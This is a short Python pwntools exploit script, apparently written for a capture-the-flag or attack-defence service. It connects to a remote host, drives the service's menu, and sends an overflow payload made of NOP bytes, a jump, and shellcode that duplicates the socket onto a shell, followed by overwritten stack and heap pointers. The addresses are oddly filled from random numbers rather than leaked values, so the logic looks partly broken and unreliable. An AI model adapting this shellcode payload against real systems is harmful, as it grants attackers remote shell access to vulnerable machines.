from pwn import *
from random import *
context(arch='i386', os='linux', log_level='info')
def method12(ip,port):
    s = remote(ip, port)

    s.sendline("N")
    r = s.recv(144)

    stack = u32(str(randint(1000,9999)))
    s.sendline("Q")
    s.sendline('I')
    s.sendline("B 4 4")
    s.sendline('X' * 16)
    s.sendline('N')
    s.sendline('V')
    heap = u32(str(randint(1000,9999)))
    s.sendline("Q")
    s.sendline('I')
    s.sendline("B 20 20")

    payload = '\xeb\x06' + 'X' * 4 + '\x90' * 2 + asm('mov ebp,0x4') + asm(pwnlib.shellcraft.i386.linux.dupsh())
    payload += 'X' * (400 - len(payload) - 24)
    payload += p32(stack - 47 - 8) + p32(heap + 12) + 'X' * 16

    s.sendline(payload)
